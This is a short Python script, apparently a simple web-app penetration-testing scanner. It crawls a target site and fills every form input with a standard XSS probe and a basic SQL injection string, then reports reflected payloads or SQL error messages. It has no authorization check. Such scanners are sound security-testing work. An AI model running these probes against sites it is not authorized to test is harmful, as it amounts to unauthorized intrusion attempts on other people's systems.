import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

class AdvancedWebAppPentest:
    def __init__(self, target_url):
        self.session = requests.Session()
        self.target_url = target_url
        self.visited_links = set()
        self.forms_tested = []

    def crawl(self, url=None):
        if url is None:
            url = self.target_url
        if url in self.visited_links:
            return
        self.visited_links.add(url)
        print(f"[+] Crawling: {url}")
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, "html.parser")
            for link in soup.find_all("a", href=True):
                href = urljoin(url, link['href'])
                if self.target_url in href and href not in self.visited_links:
                    self.crawl(href)
        except requests.RequestException as e:
            print(f"[-] Error crawling {url}: {e}")

    def extract_forms(self, url):
        print(f"[+] Extracting forms from: {url}")
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, "html.parser")
            return soup.find_all("form")
        except:
            return []

    def form_details(self, form):
        details = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        return details

    def test_xss(self, form, url):
        xss_payload = "<script>alert('XSS')</script>"
        details = self.form_details(form)
        data = {}
        for input in details['inputs']:
            if input['type'] != "submit":
                data[input['name']] = xss_payload
        target_url = urljoin(url, details['action'])
        if details['method'] == "post":
            res = self.session.post(target_url, data=data)
        else:
            res = self.session.get(target_url, params=data)
        if xss_payload in res.text:
            print(f"[!!!] XSS vulnerability found on {target_url}")
            return True
        return False

    def test_sql_injection(self, form, url):
        sql_payload = "' OR '1'='1"
        details = self.form_details(form)
        data = {}
        for input in details['inputs']:
            if input['type'] != "submit":
                data[input['name']] = sql_payload
        target_url = urljoin(url, details['action'])
        if details['method'] == "post":
            res = self.session.post(target_url, data=data)
        else:
            res = self.session.get(target_url, params=data)
        errors = ["you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark"]
        for error in errors:
            if error in res.text.lower():
                print(f"[!!!] SQL Injection vulnerability found on {target_url}")
                return True
        return False

    def run_tests(self):
        self.crawl()
        for url in self.visited_links:
            forms = self.extract_forms(url)
            for form in forms:
                if form not in self.forms_tested:
                    self.forms_tested.append(form)
                    self.test_xss(form, url)
                    self.test_sql_injection(form, url)


if __name__ == "__main__":
    target = input("Enter target URL (e.g., http://example.com): ")
    pentester = AdvancedWebAppPentest(target)
    pentester.run_tests()
